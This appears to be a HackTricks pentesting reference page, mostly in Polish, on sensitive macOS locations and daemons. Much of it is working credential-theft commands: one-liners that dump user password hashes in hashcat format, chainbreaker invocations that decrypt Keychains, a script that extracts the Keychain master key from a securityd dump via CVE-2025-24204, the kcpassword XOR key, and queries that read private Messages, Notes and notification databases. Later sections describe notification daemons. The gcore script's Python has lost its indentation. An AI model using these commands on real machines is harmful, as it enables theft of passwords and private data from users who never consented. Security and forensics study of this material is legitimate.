# macOS Sensitive Locations & Interesting Daemons

{{#include ../../../banners/hacktricks-training.md}}

## Hasła

### Shadow Passwords

Shadow password jest przechowywany wraz z konfiguracją użytkownika w plikach plist znajdujących się w **`/var/db/dslocal/nodes/Default/users/`**.\
Poniższy oneliner może być użyty do zrzucenia **wszystkich informacji o użytkownikach** (w tym informacji o hashach):
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Skrypty takie jak ten**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) lub [**ten**](https://github.com/octomagon/davegrohl.git) mogą zostać użyte do przekształcenia hash w **hashcat** **format**.

Alternatywny one-liner, który zrzuci creds wszystkich kont innych niż service account w formacie hashcat `-m 7100` (macOS PBKDF2-SHA512):
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Innym sposobem na uzyskanie `ShadowHashData` użytkownika jest użycie `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Ten plik jest **używany tylko** wtedy, gdy system działa w **single-user mode** (więc nie jest to zbyt częste).

### Keychain Dump

Zauważ, że podczas używania binarki security do **dump passwords decrypted**, pojawi się kilka promptów z prośbą do użytkownika o zezwolenie na tę operację.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
Na nowoczesnym macOS najciekawsze backing stores to zwykle **`~/Library/Keychains/login.keychain-db`** i **`/Library/Keychains/System.keychain`**. Są to pliki oparte na SQLite, ale dostęp do plaintext nadal jest pośredniczony przez **`securityd`**: kradzież surowego DB daje głównie metadane i zaszyfrowane blob-y, chyba że odzyskasz także hasło użytkownika, `SystemKey` albo master key z pamięci.

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Based on this comment [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) wygląda na to, że te narzędzia nie działają już w Big Sur.

### Keychaindump Overview

Narzędzie o nazwie **keychaindump** zostało opracowane do wyodrębniania haseł z macOS keychains, ale napotyka ograniczenia na nowszych wersjach macOS, takich jak Big Sur, jak wskazano w [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Użycie **keychaindump** wymaga, aby atakujący uzyskał dostęp i podniósł uprawnienia do **root**. Narzędzie wykorzystuje fakt, że keychain jest domyślnie odblokowany po zalogowaniu użytkownika dla wygody, co pozwala aplikacjom uzyskiwać do niego dostęp bez wielokrotnego podawania hasła użytkownika. Jednak jeśli użytkownik wybierze blokowanie keychain po każdym użyciu, **keychaindump** staje się nieskuteczny.

**Keychaindump** działa, atakując konkretny proces o nazwie **securityd**, opisywany przez Apple jako daemon do operacji autoryzacji i kryptograficznych, kluczowy dla dostępu do keychain. Proces wyodrębniania polega na zidentyfikowaniu **Master Key** pochodzącego z hasła logowania użytkownika. Ten klucz jest niezbędny do odczytu pliku keychain. Aby zlokalizować **Master Key**, **keychaindump** skanuje heap pamięci procesu **securityd** za pomocą polecenia `vmmap`, szukając potencjalnych kluczy w obszarach oznaczonych jako `MALLOC_TINY`. Do sprawdzenia tych lokalizacji pamięci używane jest następujące polecenie:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Po zidentyfikowaniu potencjalnych master keys, **keychaindump** przeszukuje heaps w poszukiwaniu konkretnego wzorca (`0x0000000000000018`), który wskazuje kandydata na master key. Do wykorzystania tego klucza wymagane są dalsze kroki, w tym deobfuscation, jak opisano w source code **keychaindump**. Analitycy skupiający się na tym obszarze powinni zauważyć, że kluczowe dane do decrypting keychain są przechowywane w pamięci procesu **securityd**. Przykładowa komenda do uruchomienia **keychaindump** to:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) może być użyty do wydobycia następujących typów informacji z keychaina OSX w sposób zgodny z wymaganiami forensycznymi:

- Hashed Keychain password, odpowiednie do łamania za pomocą [hashcat](https://hashcat.net/hashcat/) lub [John the Ripper](https://www.openwall.com/john/)
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

Mając hasło do odblokowania keychaina, master key uzyskany za pomocą [volafox](https://github.com/n0fate/volafox) lub [volatility](https://github.com/volatilityfoundation/volatility), albo plik odblokowujący, taki jak SystemKey, Chainbreaker udostępni również hasła w postaci plaintext.

Bez jednej z tych metod odblokowania Keychaina, Chainbreaker wyświetli wszystkie inne dostępne informacje.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Zrzut kluczy keychain (z hasłami) za pomocą SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Zrzut kluczy keychain (z hasłami) przez łamanie hasha**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Zrzut kluczy keychain (z hasłami) z memory dump**

[Wykonaj następujące kroki](../index.html#dumping-memory-with-osxpmem), aby przeprowadzić **memory dump**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Zrzuć klucze keychain (z hasłami) używając hasła użytkownika**

Jeśli znasz hasło użytkownika, możesz go użyć do **zrzucenia i odszyfrowania keychainów należących do użytkownika**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Główne hasło Keychain przez entitlement `gcore` (CVE-2025-24204)

macOS 15.0 (Sequoia) dostarczył `/usr/bin/gcore` z entitlement **`com.apple.system-task-ports.read`**, więc każdy lokalny admin (lub złośliwa podpisana app) mógł zrzucić **pamięć dowolnego procesu nawet przy wymuszonym SIP/TCC**. Zrzut `securityd` ujawnia **główne hasło Keychain** w postaci jawnej i pozwala odszyfrować `login.keychain-db` bez hasła użytkownika.

**Szybka reprodukcja na podatnych buildach (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Feed the extracted hex key to Chainbreaker (`--key <hex>`) to decrypt the login keychain. Apple removed the entitlement in **macOS 15.3+**, so this only works on unpatched Sequoia builds or systems that kept the vulnerable binary.

### kcpassword

The **kcpassword** file is a file that holds the **user’s login password**, but only if the system owner has **enabled automatic login**. Therefore, the user will be automatically logged in without being asked for a password (which isn't very secure).

The password is stored in the file **`/etc/kcpassword`** xored with the key **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. If the users password is longer than the key, the key will be reused.\
This makes the password pretty easy to recover, for example using scripts like [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interesting Information in Databases

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notifications

Przed **Sequoia** zazwyczaj można znaleźć magazyn Notification Center w **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. W **Sequoia+** Apple przeniosło go do chronionego przez TCC group container **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.

Większość interesujących informacji jest przechowywana w kolumnach **blob**, więc trzeba wyodrębnić tę zawartość i przekształcić ją w coś czytelnego dla człowieka (`plutil -p -`, `strings` albo mały parser). Szybkie przykłady triage:
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### Ostatnie problemy z prywatnością (NotificationCenter DB)

- W macOS **14.7–15.1** Apple przechowywało treść bannerów w SQLite `db2/db` bez odpowiedniego redaction. CVE **CVE-2024-44292/44293/40838/54504** pozwalały dowolnemu lokalnemu użytkownikowi odczytać tekst powiadomień innych użytkowników, po prostu otwierając DB (bez promptu TCC).
- Apple ograniczyło to, przenosząc DB do `group.com.apple.usernoted` i zabezpieczając ją przez TCC w nowszych buildach Sequoia, więc na obecnych systemach zwykle potrzebujesz właściwego kontekstu użytkownika albo bypass TCC, żeby to odczytać.
- Na starszych endpointach skopiuj razem pliki `db`, `db-wal` i `db-shm` przed aktualizacją lub restartem, jeśli chcesz zachować artefacts.

### Notatki

Notatki użytkowników **notes** można znaleźć w `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
Jeśli powyższy one-liner jest zbyt głośny, wyeksportuj `ZICNOTEDATA.ZDATA`, rozpakuj go przez gunzip i sparsuj protobuf: zwykle jest to bardziej niezawodne niż uruchamianie `strings` bezpośrednio na SQLite.

### Background Tasks / Login Items

Od **Ventura**, elementy logowania zatwierdzone przez użytkownika i kilka zadań w tle są śledzone w magazynach **BTM** takich jak **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** oraz wersjonowanym systemowym cache **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Te pliki są przydatne do szybkiego identyfikowania persistence, narzędzi pomocniczych oraz niektórych zarządzanych przez MDM elementów tła:
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
For the persistence angle and BTM internals, check [the auto-start locations page](../../macos-auto-start-locations.md#login-items) and [the Background Tasks Management notes](../macos-security-protections/README.md#background-tasks-management).

## Preferences

W macOS preferencje znajdują się w **`$HOME/Library/Preferences`**, a w iOS w `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

W macOS narzędzie CLI **`defaults`** może być użyte do **modyfikacji pliku Preferences**.

**`/usr/sbin/cfprefsd`** obsługuje usługi XPC `com.apple.cfprefsd.daemon` i `com.apple.cfprefsd.agent` i może być wywołane do wykonywania działań takich jak modyfikacja preferencji.

## OpenDirectory permissions.plist

Plik `/System/Library/OpenDirectory/permissions.plist` zawiera uprawnienia stosowane do atrybutów węzła i jest chroniony przez SIP.\
Ten plik przyznaje uprawnienia określonym użytkownikom przez UUID (a nie uid), dzięki czemu mogą uzyskać dostęp do określonych wrażliwych informacji, takich jak między innymi `ShadowHashData`, `HeimdalSRPKey` i `KerberosKeys`:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## Powiadomienia systemowe

### Powiadomienia Darwin

Główny daemon dla powiadomień to **`/usr/sbin/notifyd`**. Aby otrzymywać powiadomienia, klienci muszą zarejestrować się przez port Mach `com.apple.system.notification_center` (sprawdź je za pomocą `sudo lsmp -p <pid notifyd>`). Daemon jest konfigurowalny za pomocą pliku `/etc/notify.conf`.

Nazwy używane dla powiadomień są unikalnymi notacjami reverse DNS i gdy powiadomienie zostanie wysłane do jednej z nich, klient(y), które zadeklarowały, że mogą je obsłużyć, otrzymają je.

Możliwe jest zrzucenie bieżącego statusu (i zobaczenie wszystkich nazw) poprzez wysłanie sygnału SIGUSR2 do procesu notifyd i odczytanie wygenerowanego pliku: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

**Distributed Notification Center**, którego głównym binarnym plikiem jest **`/usr/sbin/distnoted`**, to kolejny sposób wysyłania powiadomień. Udostępnia on niektóre usługi XPC i wykonuje pewne sprawdzenia, aby spróbować zweryfikować klientów.

### Apple Push Notifications (APN)

W tym przypadku aplikacje mogą rejestrować się dla **topics**. Klient wygeneruje token, kontaktując się z serwerami Apple przez **`apsd`**.\
Następnie providerzy również wygenerują token i będą mogli połączyć się z serwerami Apple, aby wysyłać wiadomości do klientów. Te wiadomości zostaną lokalnie odebrane przez **`apsd`**, które przekaże powiadomienie do aplikacji, która na nie czeka.

Preferencje znajdują się w `/Library/Preferences/com.apple.apsd.plist`.

W macOS istnieje lokalna baza danych wiadomości znajdująca się w `/Library/Application\ Support/ApplePushService/aps.db`, a w iOS w `/var/mobile/Library/ApplePushService`. Ma ona 3 tabele: `incoming_messages`, `outgoing_messages` i `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Można też uzyskać informacje o daemonie i połączeniach, używając:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Powiadomienia użytkownika

To są powiadomienia, które użytkownik powinien zobaczyć na ekranie:

- **`CFUserNotification`**: Te API zapewniają sposób wyświetlenia na ekranie wyskakującego okna z wiadomością.
- **The Bulletin Board**: To pokazuje w iOS baner, który znika i zostanie zapisany w Notification Center.
- **`NSUserNotificationCenter`**: To jest iOS bulletin board w MacOS. W starszych wersjach macOS baza danych zwykle znajduje się w `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; w Sequoia+ została przeniesiona do `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## Referencje

- **HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)**](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- **Apple Platform Security – Keychain data protection](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- **9to5Mac – Apple addresses privacy concerns around Notification Center database in macOS Sequoia**](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
